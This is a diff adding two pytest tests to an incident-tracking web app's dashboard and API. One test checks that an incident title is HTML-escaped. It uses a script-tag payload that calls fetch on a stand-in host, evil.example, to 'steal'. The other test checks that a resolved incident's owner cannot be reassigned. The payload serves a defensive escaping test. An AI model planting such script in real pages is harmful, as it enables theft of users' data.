@@ -71,3 +71,30 @@ def test_metrics_expose_workload():
     assert metrics["total"] >= 3
     assert metrics["open"] >= 1
     assert metrics["unassigned"] >= 1
+
+
+def test_dashboard_escapes_incident_title():
+    """A malicious title must render as inert text, not execute as HTML."""
+    payload = "<script>fetch('//evil.example/steal')</script> latency spike"
+    client.post(
+        "/api/incidents",
+        json={"title": payload, "service": "payments", "severity": "low"},
+    )
+    response = client.get("/")
+    assert "<script>fetch" not in response.text
+    assert "&lt;script&gt;" in response.text
+
+
+def test_owner_cannot_be_reassigned_on_resolved_incident():
+    incident = client.post(
+        "/api/incidents",
+        json={"title": "Cache warm-up delayed", "service": "search", "severity": "low"},
+    ).json()
+    client.patch(f"/api/incidents/{incident['id']}/status", json={"status": "investigating"})
+    client.patch(f"/api/incidents/{incident['id']}/status", json={"status": "resolved"})
+
+    response = client.patch(
+        f"/api/incidents/{incident['id']}/owner",
+        json={"owner": "sam"},
+    )
+    assert response.status_code == 409
